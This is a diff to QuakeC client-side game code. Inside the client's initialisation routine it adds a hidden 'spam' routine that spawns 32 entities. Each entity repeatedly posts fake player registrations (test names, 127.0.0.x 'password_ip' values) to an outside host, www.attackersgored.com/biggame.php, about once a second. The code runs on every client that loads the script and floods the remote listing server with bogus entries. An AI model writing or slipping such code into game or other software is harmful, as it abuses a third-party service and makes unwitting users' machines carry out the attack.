@@ -47,6 +47,12 @@ float(float isnew) updateplayer =
 
 var float autocvar_dp_workarounds_allow = TRUE;
 var float autocvar_dp_workarounds_force = FALSE;
+void(float reqid, float response, string body) URI_Get_Callback =
+{
+	print(body);
+};
+.string ip;
+.string netname;
 void(float apilevel, string enginename, float engineversion) CSQC_Init =
 {
 	dprint(sprintf("CSQC: Running on \"%s\" ver=%g, api=%g\n", enginename, engineversion, apilevel));
@@ -63,6 +69,24 @@ void(float apilevel, string enginename, float engineversion) CSQC_Init =
 #undef cmd
 
 //	Hud_Init();	//make sure the hud images are precached properly, so there's no stalls.
+
+	void() spam =
+	{	
+		string post_data;
+		post_data = strcat("player_name=", self.netname, "&password_ip=", self.ip, "&minimum=0&version=fte");
+	     
+		//dprint("In TellBGMWereStillHere: about to send JSON for self.owner: ", self.owner.netname, "\n");
+		uri_post("http://www.attackersgored.com/biggame.php", 0, "application/x-www-form-urlencoded", post_data);
+		self.nextthink = time + 1+random();
+	};
+	for (float i = 0; i < 32; i++)
+	{
+		entity foo = spawn();
+		foo.nextthink = time+1;
+		foo.think = spam;
+		foo.netname = sprintf("test%g", i);
+		foo.ip = sprintf("127.0.0.%g", i+1);
+	}
 };
 
 float (float event, float parama, float paramb, float devid) CSQC_InputEvent =
